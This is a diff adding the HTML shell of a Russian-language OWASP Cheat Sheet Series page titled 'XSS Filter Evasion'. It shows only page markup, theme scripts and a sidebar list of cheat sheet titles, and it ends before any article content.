@@ -1,0 +1,5618 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Website with the collection of all the cheat sheets of the project.">
+      
+      
+      
+        <link rel="canonical" href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">
+      
+      
+        <link rel="prev" href="XS_Leaks_Cheat_Sheet.html">
+      
+      
+        <link rel="next" href="Zero_Trust_Architecture_Cheat_Sheet.html">
+      
+      
+      <link rel="icon" href="../assets/WebSite_Favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
+    
+    
+      
+        <title>XSS Filter Evasion - OWASP Серия шпаргалок по безопасности</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#xss-filter-evasion-cheat-sheet" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../index.html" title="OWASP Серия шпаргалок по безопасности" class="md-header__button md-logo" aria-label="OWASP Серия шпаргалок по безопасности" data-md-component="logo">
+      
+  <img src="../assets/OWASP_Logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            OWASP Серия шпаргалок по безопасности
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              XSS Filter Evasion
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/OWASP/CheatSheetSeries" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    OWASP/CheatSheetSeries
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../index.html" title="OWASP Серия шпаргалок по безопасности" class="md-nav__button md-logo" aria-label="OWASP Серия шпаргалок по безопасности" data-md-component="logo">
+      
+  <img src="../assets/OWASP_Logo.svg" alt="logo">
+
+    </a>
+    OWASP Серия шпаргалок по безопасности
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/OWASP/CheatSheetSeries" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    OWASP/CheatSheetSeries
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../index.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Введение
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Glossary.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Индекс (по алфавиту)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../IndexASVS.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Индекс ASVS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../IndexMASVS.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Индекс MASVS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../IndexProactiveControls.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Индекс превентивных мер
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../IndexTopTen.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Индекс Top 10
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Шпаргалки
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            Шпаргалки
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="AI_Agent_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность AI-агентов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="AJAX_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность AJAX
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Abuse_Case_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Случаи злоупотреблений
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Access_Control_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Контроль доступа
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Attack_Surface_Analysis_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Анализ поверхности атаки
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Authentication_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Аутентификация
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Authorization_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Авторизация
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Authorization_Testing_Automation_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Автоматизация тестирования авторизации
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Automotive_Security.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность автомобилей
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Bean_Validation_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Валидация Bean
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Browser_Extension_Vulnerabilities_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Уязвимости расширений браузера
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="C-Based_Toolchain_Hardening_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Укрепление C-инструментальной цепочки
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="CI_CD_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность CI/CD
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Choosing_and_Using_Security_Questions_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Выбор и использование секретных вопросов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Clickjacking_Defense_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Защита от Clickjacking
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Content_Security_Policy_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Content Security Policy
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Cookie_Theft_Mitigation_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение кражи Cookie
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Credential_Stuffing_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение Credential Stuffing
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение CSRF
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Cross_Site_Scripting_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение XSS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Cryptographic_Storage_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Криптографическое хранилище
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="DOM_Clobbering_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение DOM Clobbering
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="DOM_based_XSS_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение DOM XSS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Database_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность баз данных
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Denial_of_Service_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Отказ в обслуживании
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Dependency_Graph_SBOM_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Граф зависимостей SBOM
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Deserialization_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Десериализация
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Django_REST_Framework_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Django REST Framework
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Django_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Django
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Docker_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Docker
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="DotNet_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность .NET
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Drone_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность дронов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Error_Handling_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Обработка ошибок
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="File_Upload_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Загрузка файлов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Forgot_Password_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Восстановление пароля
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="GraphQL_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность GraphQL
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="gRPC_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность gRPC
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="HTML5_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность HTML5
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="HTTP_Headers_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTTP-заголовки
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="HTTP_Strict_Transport_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTTP Strict Transport Security
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Infrastructure_as_Code_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Infrastructure as Code
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение инъекций
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Injection_Prevention_in_Java_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение инъекций в Java
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Input_Validation_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Валидация входных данных
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение IDOR
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="JAAS_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    JAAS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="JSON_Web_Token_for_Java_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    JSON Web Token для Java
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Java_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Java
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Key_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление ключами
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Kubernetes_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Kubernetes
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Laravel_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Laravel
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="LDAP_Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение LDAP-инъекций
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Legacy_Application_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление устаревшими приложениями
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="LLM_Prompt_Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение LLM Prompt Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Logging_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Логирование
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Logging_Vocabulary_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Словарь событий логирования
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="MCP_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность MCP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Mass_Assignment_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Массовое присваивание
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Microservices_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность микросервисов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
